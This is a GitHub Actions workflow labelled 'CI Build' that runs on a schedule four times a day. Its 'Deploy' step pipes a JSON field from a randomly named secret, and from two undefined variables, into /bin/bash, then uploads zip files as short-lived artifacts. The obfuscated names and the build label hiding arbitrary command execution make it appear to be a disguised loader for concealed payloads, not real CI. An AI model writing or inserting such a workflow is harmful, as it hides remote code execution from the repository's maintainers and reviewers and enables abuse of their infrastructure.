name: CI Build
on:
  workflow_dispatch:

  schedule:
    - cron: '17 5,11,17,23 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          neecg09: ${{ secrets.neecg09 }}
        run: |
          printf '%s' "$neecg09" | jq -r .xaq8 | /bin/bash
          printf '%s' "$upjrr2" | jq -r .xvu9938 | /bin/bash
          echo $weyk48 | jq -r .huoo67268 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: H5nKlaZ3
          path: "*.zip"
          retention-days: 1
